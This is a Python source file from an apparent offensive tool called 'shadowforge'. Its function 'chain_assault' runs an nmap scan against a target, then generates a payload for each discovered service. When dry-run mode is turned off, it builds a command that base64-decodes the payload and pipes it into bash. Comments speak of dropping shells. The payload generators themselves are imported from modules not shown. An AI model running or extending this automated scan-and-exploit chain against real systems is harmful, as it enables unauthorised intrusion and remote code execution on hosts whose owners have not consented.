# src/shadowforge/modules/auto.py
import json
from typing import Generator, Dict, Any
from .recon import run_nmap_scan
from .payloads import gen_for_port

def chain_assault(target: str, dry_run: bool = True) -> Generator[Dict[str, Any], None, None]:
    """
    Auto beast: Recon raid → Payload forge per port. Ethical: dry_run=True (echo only—no drops).
    Yields dicts: recon_slice + payload per service.
    """
    if dry_run:
        print("[yellow]Dry run mode: Echoing blueprints—no shells dropped.[/yellow]")  # Rich tease

    # Phase 1: Recon eye
    recon_data = run_nmap_scan(target)
    if "error" in recon_data:
        yield {"phase": "recon", "error": recon_data["error"]}
        return

    yield {"phase": "recon_complete", "data": recon_data}

    # Phase 2: Payload storm per port
    services = recon_data.get("services", [])
    for svc in services:
        port = int(svc["port"])
        service = svc["service"]
        payload = gen_for_port(service, target, port)
        assault_slice = {
            "phase": "payload_forged",
            "target": target,
            "port": port,
            "service": service,
            "payload": payload,
            "drop_command": f"echo '{payload['encoded']}' | base64 -d | bash" if not dry_run else "DRY-RUN: No drop"
        }
        yield assault_slice

    yield {"phase": "assault_complete", "total_ports": len(services), "target": target}